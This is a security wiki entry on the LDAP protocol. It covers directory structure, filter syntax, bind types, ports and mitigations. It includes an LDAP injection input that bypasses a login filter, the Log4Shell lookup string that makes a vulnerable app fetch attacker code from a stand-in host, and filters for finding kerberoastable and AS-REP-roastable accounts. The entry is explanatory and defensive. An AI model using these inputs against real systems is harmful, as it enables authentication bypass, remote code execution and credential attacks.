---
title: LDAP
slug: ldap
category: protocols
summary: Lightweight Directory Access Protocol (LDAP) is the standard protocol for querying and modifying directory services — most importantly, Active Directory. LDAP is the lingua franca enterprise applications use to look up users, validate credentials, and enumerate group memberships.
related: [active-directory, kerberos, ntlm, bloodhound, saml]
aliases: [Lightweight Directory Access Protocol, LDAPS, LDAP Protocol]
updated: 2026-05-25
---

**LDAP** (Lightweight Directory Access Protocol) is the standard protocol for querying and modifying directory services. Defined originally by RFC 1487 (1993) and refined in RFCs 4510-4519 (2006), LDAP is the protocol enterprise applications speak to look up users, validate credentials, search by group membership, and read attributes from a directory.

In modern enterprises, "talking LDAP" almost always means talking to [Active Directory](/wiki/active-directory). LDAP and Kerberos are the two primary protocols on a domain: Kerberos authenticates users to services; LDAP answers "who is this user, what groups, what attributes?"

## How LDAP works

A directory is a hierarchical tree. Entries are addressed by **Distinguished Names** (DNs):

```
DC=corp,DC=example,DC=com
 ├─ OU=Workstations
 │   └─ CN=LAPTOP-42
 ├─ OU=Users
 │   ├─ CN=Alice Smith
 │   │   ├─ sAMAccountName: alice
 │   │   ├─ mail: alice@example.com
 │   │   └─ memberOf: CN=Domain Admins,...
 │   └─ CN=Bob Jones
 └─ CN=Domain Controllers
```

A query specifies:

- **Base DN** — where in the tree to start (`OU=Users,DC=corp,DC=example,DC=com`).
- **Scope** — `base` (this entry), `onelevel` (immediate children), or `subtree` (everything below).
- **Filter** — boolean expression over attributes: `(&(objectClass=user)(memberOf=CN=Engineering,...))`.
- **Attributes** — which fields to return.

The result is zero or more entries with the requested attributes.

## LDAP filters — the syntax

| Filter | Meaning |
|---|---|
| `(sAMAccountName=alice)` | Username equals `alice`. |
| `(objectClass=user)` | All user objects. |
| `(&(objectClass=user)(memberOf=CN=Domain Admins,...))` | Users in Domain Admins. |
| `(!(userAccountControl:1.2.840.113556.1.4.803:=2))` | Accounts that are *not* disabled (bitwise AND on UAC). |
| `(servicePrincipalName=*)` | Accounts with SPNs — kerberoastable. |
| `(adminCount=1)` | Privileged accounts (Domain Admins, Account Operators, etc. — see AdminSDHolder). |

These filters are what [BloodHound](/wiki/bloodhound) uses to enumerate AD and what attackers use to find quick wins.

## LDAP authentication

A client binds to the server in one of several ways:

| Bind type | Protocol |
|---|---|
| **Anonymous bind** | No credentials. Historically allowed; usually disabled in modern AD. |
| **Simple bind** | DN + cleartext password. Should only run over LDAPS (TLS-wrapped). |
| **SASL bind with GSSAPI** | Kerberos-authenticated bind. The standard for AD-integrated apps. |
| **SASL bind with NTLM** | NTLM-authenticated bind. Legacy. |

### Ports

| Port | Protocol |
|---|---|
| **389/tcp** | LDAP (plaintext unless StartTLS is negotiated). |
| **636/tcp** | LDAPS — LDAP over TLS from the first byte. |
| **3268/tcp** | Global Catalog LDAP — read-only forest-wide view. |
| **3269/tcp** | Global Catalog LDAP over TLS. |

## LDAP in security

### LDAP enumeration (offense)

Once an attacker has any authenticated AD user, LDAP gives them visibility into the entire domain:

- **List all users** — `(objectClass=user)`.
- **Find Domain Admins** — `(memberOf=CN=Domain Admins,...)`.
- **Find SPNs to kerberoast** — `(servicePrincipalName=*)`.
- **Find accounts with `DONT_REQUIRE_PREAUTH`** — `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` (AS-REP roasting targets).
- **Find LAPS-readable groups** — examine the ACL on `ms-Mcs-AdmPwd` / `msLAPS-Password`.

This is what BloodHound's `SharpHound.exe` collector does at scale, then exports as JSON for graph analysis.

### LDAP injection

Web applications that build LDAP filters by string concatenation are vulnerable to **LDAP injection** — analogous to [SQL injection](/wiki/sql-injection). A login form that constructs:

```
(&(uid=USERINPUT)(password=USERPASS))
```

is vulnerable if `USERINPUT` is `admin)(|(uid=*` because the resulting filter becomes:

```
(&(uid=admin)(|(uid=*)(password=anything))
```

— which matches the admin user regardless of password. Mitigation: parameterize, validate input, escape special characters per RFC 4515.

### LDAP over insecure transport

Plaintext LDAP on port 389 exposes credentials when simple bind is used. Mitigations:

- Enforce **LDAP signing** (server-side) so unsigned binds are rejected.
- Enforce **LDAP channel binding** (TLS-bound binds prevent NTLM relay onto LDAP).
- Disable simple bind on port 389; require LDAPS (636) for password-bearing operations.

Microsoft pushed these defaults via the "ADV190023" advisory after researchers showed NTLM relay attacks could land on LDAP and add domain admins from a coerced workstation auth.

## LDAP and modern identity

Even in cloud-first organizations using Okta / Entra ID / Auth0, LDAP usually persists for:

- **Legacy applications** that only speak LDAP.
- **Network gear** (VPN concentrators, switches, printers) that authenticates against LDAP.
- **Linux integration** (SSSD speaks LDAP to authenticate Linux hosts against AD).
- **Java enterprise apps** with JNDI bindings.

The JNDI binding case is what made **Log4Shell (CVE-2021-44228)** so devastating — Log4j's `${jndi:ldap://attacker/x}` lookups caused vulnerable apps to fetch and execute attacker-controlled Java classes via LDAP.

## Operational notes

- **Index your queries.** Unindexed LDAP filters can table-scan tens of thousands of objects per request. Index expensive attributes (`servicePrincipalName`, `userPrincipalName`).
- **Limit query result size.** AD's default `MaxPageSize` (1000) prevents an attacker (or a misconfigured app) from dumping the entire directory in one shot — but the attacker can paginate.
- **Audit LDAP queries.** Domain controllers can log LDAP query patterns; anomalous broad queries (`(servicePrincipalName=*)` from a workstation that's never queried before) are high-fidelity detections.
- **Restrict LDAP enumeration**. Sensitive attributes can be ACL-restricted so non-privileged users see less of the directory.

## Further reading

- [RFC 4511 — LDAP The Protocol](https://datatracker.ietf.org/doc/html/rfc4511).
- [Microsoft AD LDAP reference](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/).
- [SpecterOps — LDAP attack patterns](https://specterops.io/blog/).
- [ADV190023 — LDAP channel binding & signing](https://msrc.microsoft.com/update-guide/vulnerability/ADV190023).
